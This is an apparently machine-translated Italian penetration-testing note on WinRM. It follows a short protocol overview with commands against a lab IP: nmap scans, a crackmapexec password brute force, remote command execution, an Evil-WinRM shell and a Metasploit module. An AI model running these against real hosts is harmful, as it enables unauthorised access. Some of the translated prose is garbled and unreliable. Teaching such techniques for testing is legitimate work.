
La gestione remota di Windows ( WinRM) è un semplice protocollo di gestione remota integrato in Windows basato sulla riga di comando. WinRM utilizza il protocollo di accesso agli oggetti semplici ( SOAP) per stabilire connessioni con host remoti e le relative applicazioni. Pertanto, WinRM deve essere abilitato e configurato esplicitamente a partire da Windows 10. WinRM si basa su TCPporti 5985E 5986per la comunicazione, con l'ultima porta 5986 using HTTPS, poiché le porte 80 e 443 venivano precedentemente utilizzate per questo compito. Tuttavia, poiché la porta 80 è stata bloccata principalmente per motivi di sicurezza, oggi vengono utilizzate le nuove porte 5985 e 5986. 

Un altro componente adatto a WinRM per l'amministrazione è Windows Remote Shell ( WinRS), che ci consente di eseguire comandi arbitrari sul sistema remoto. Il programma è incluso anche in Windows 7 per impostazione predefinita. Pertanto, con WinRM è possibile eseguire un comando remoto su un altro server. 

Servizi come le sessioni remote che utilizzano PowerShell e l'unione dei registri eventi richiedono WinRM. È abilitato per impostazione predefinita a partire da Windows Server 2012versione, ma deve prima essere configurato per versioni server e client precedenti e creare le eccezioni firewall necessarie.


```
> nmap --top-ports 7000 10.4.30.175
> nmap -sV -p 5985 10.4.30.175


5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

# Crackmapexec - WinRM Bruteforce 
> crackmapexec winrm 10.4.30.175 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

> crackmapexec winrm 10.4.30.175 -u administrator -p tinkerbell -x "whoami" 
> crackmapexec winrm 10.4.30.175 -u administrator -p tinkerbell -x "systeminfo"

#Evil-WinRM - get command shell:
> evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.4.30.175


Metasploit -  WinRM 
> search winrm_script 
use exploit/windows/winrm/winrm_script_exec 
set RHOSTS 10.4.30.175 
set USERNAME administrator 
set PASSWORD tinkerbell 
set FORCE_VBS true 
exploit
```